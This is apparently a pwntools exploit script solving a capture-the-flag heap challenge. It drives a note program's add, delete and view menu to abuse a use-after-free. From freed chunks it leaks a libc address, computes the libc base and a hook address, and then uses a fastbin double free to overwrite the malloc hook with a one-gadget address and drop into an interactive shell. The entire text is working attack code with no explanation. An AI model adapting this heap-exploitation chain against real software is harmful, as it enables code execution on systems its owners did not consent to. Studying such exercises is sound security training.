from pwn import *
io=process("./chall")
#io=remote("35.226.111.216",4444)
def add(index,topic,size,body):
    io.sendlineafter(">>","1")
    io.sendlineafter("Enter the index",str(index))
    io.sendlineafter("Enter the topic",topic) 
    io.sendlineafter("Enter the size of body",str(size))
    io.sendlineafter("Enter the body",body)

def delete(index):
    io.sendlineafter(">>","3")
    io.sendlineafter("Enter the index",str(index))

def view(index):
    io.sendlineafter(">>","4")
    io.sendlineafter("Enter the index",str(index))

def edit(index,topic,body):
    io.sendlineafter(">>","2")
    io.sendlineafter("Enter the index",str(index))
    io.sendlineafter("Enter the new topic",topic)
    io.sendlineafter("Enter the new body",body)

add(0,"sourag",250,"aaaaaaaaaaaaa")
add(2,"sou",0x20,"bbbb")
add(3,"sou",0x20,"bbbb")
add(1,"hello",50,"bb")
delete(0)
delete(2)
delete(3)
view(0)

io.recvuntil("Body : ")

leak=u64(io.recv(6)+"\x00\x00")

print hex(leak)

libc_base=leak-0x3c4b78

hook=libc_base+0x3c4aed

print hex(hook)

view(3)

io.recvuntil("Body : ")

leak=u64(io.recv(6)+"\x00\x00")

print hex(leak)

system=libc_base+0xf1147

print hex(system)
add(0,"soura",0x60,"aaaaaaaaaa")
add(1,"sourag",0x60,"bbbbbbbb")

delete(0)
delete(1)
delete(0)

add(4,p64(leak),0x60,p64(hook))
add(5,"sourag",0x60,"aaaaaaaa")
add(6,"sourag",0x60,"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb")

pay="a"*19+p64(system)
a=0x60
add(8,"sourag",0x60,pay)
gdb.attach(io)
io.interactive()
